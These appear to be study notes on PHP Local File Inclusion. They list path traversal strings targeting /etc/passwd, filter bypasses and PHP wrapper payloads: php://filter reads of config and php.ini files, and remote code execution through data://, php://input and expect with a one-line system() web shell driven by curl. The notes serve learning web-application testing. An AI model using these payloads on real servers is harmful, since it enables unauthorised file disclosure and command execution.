# FILE INCLUSIONS 

If such functionalities are not securely coded, an attacker may manipulate these parameters to display the content of any local file on the hosting server, leading to a Local File Inclusion (LFI) vulnerability.

LFI vulnerabilities can lead to source code disclosure, sensitive data exposure, and even remote code execution under certain conditions

## Path Traversal
absolute path - `/etc/passwd`
relative path - `../../../..//etc/passwd`

# Filename Prefix

    example php code:
    include("lang_" . $_GET['language']);

In this case, if we try to traverse the directory with ../../../etc/passwd, the final string would be lang_../../../etc/passwd, which is invalid:

to bypass this we use prifix `/`

    lang_/../../../../etc/passwd

# Appended Extensions

    example php
    include($_GET['language'] . ".php");

the above result into the `/etc/passwd.php`

# second Order attack 
Exploiting LFI vulnerabilities using second-order attacks is similar to what we have discussed in this section. The only variance is that we need to spot a function that pulls a file based on a value we indirectly control and then try to control that value to exploit the vulnerability.

## bypass filters
**1. Non-Recursive Path Traversal Filters**

    $language = str_replace('../', '', $_GET['language']);         #replace "../" with ""

this may work if the filter is not recrusively remove at output `....//....//....//....//etc/passwd` or  `..././` `....\/` ` ....////` 

**2. Encoding**

If the target web application did not allow `.` and `/` in our input, we can URL encode `../` into `%2e%2e%2f`, which may bypass the filter.

**3. Approved Paths**

Some web applications may also use Regular Expressions to ensure the render file is under the specific directory always eg `./languages`

    if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
        include($_GET['language']);
    } else {
        echo 'Illegal path specified!';
    }

To find the approved path, we can examine the requests sent by the existing forms, and see what path they use for the normal web functionality. Furthermore, we can fuzz web directories under the same path, and try different ones until we get a match. To bypass this, we may use path traversal and start our payload with the approved path, and then use ../ to go back to the root directory and read the file we specify


**4. Appended Extension**
some web applications append an extension to our input string (e.g. .php), to ensure that the file we include is in the expected extension.

**5. Path Truncation**
In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be truncated, and any characters after the maximum length will be ignored. 

    ?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]


    echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done

**6. Null Bytes**

PHP versions before 5.5 were vulnerable to null byte injection, which means that adding a null byte (%00) at the end of the string would terminate the string and not consider anything after it. To exploit this vulnerability, we can end our payload with a null byte `(e.g. /etc/passwd%00)`

## PHP Fileters
we are using the [php Wrappers](https://www.php.net/manual/en/wrappers.php.php) to bypass the filter or read the sensitive files. This is not only beneficial with LFI attacks, but also with other web attacks like XXE
**Input Filters** we can access the PHP filter wrapper with `php://filter/`, the main ones we require for our attack are resource and read. There are four different types of filters available for use, which are String Filters, Conversion Filters, Compression Filters, and Encryption Filters the filter that is useful for LFI attacks is the convert.base64-encode filter, under Conversion Filters

fuzz it and know what are file available to availabe with any sensitive information. by using the tools like ffuf or gobuster. and we are intersted in `301`, `302` and `403` as well as `200`.

attack surface - `http://<SERVER_IP>:<PORT>/index.php?language=config`. In this url the .php is appending by the backend server and it passes the `config` means that at the backend it is `config.php` and after requesting this file we see nothing because it has no html to render to the brwser so we are endoding every thing into the `base64` then decode it all to see the file `config.php`.

payload `php://filter/read=convert.base64-encode/resource=config`

## PHP wrapper
**Data**
The `data` wrapper can be used to include external data, including PHP code. data wrapper is only available to use if the (allow_url_include) setting is enabled in the PHP configurations. first confirm whether this setting is enabled, by reading the PHP configuration file through the LFI vulnerability.

`(/etc/php/X.Y/apache2/php.ini)` for Apache or at `(/etc/php/X.Y/fpm/php.ini)` for Nginx, where X.Y is your install PHP version. 

`curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"` using burp or curl because the string is very long and it capture carefully.

Remote Code Execution:  We can also pass it base64 encoded strings with text/plain;base64, and it has the ability to decode them and execute the PHP code.

    echo '<?php system($_GET["cmd"]); ?>' | base64

    curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid

**Input**

the input wrapper also depends on the `allow_url_includ`e setting, the input wrapper as a POST request's data, So, the vulnerable parameter must accept POST requests for this attack to work.

    curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid


**Expect**
as we do previous for the `allow_url_includ` same for the `expect` it must be in active mode to work the vuln.
and with this expect we dont need to pass the webshell because it is made for the execution of the cmd at system level.

    echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
    extension=expect

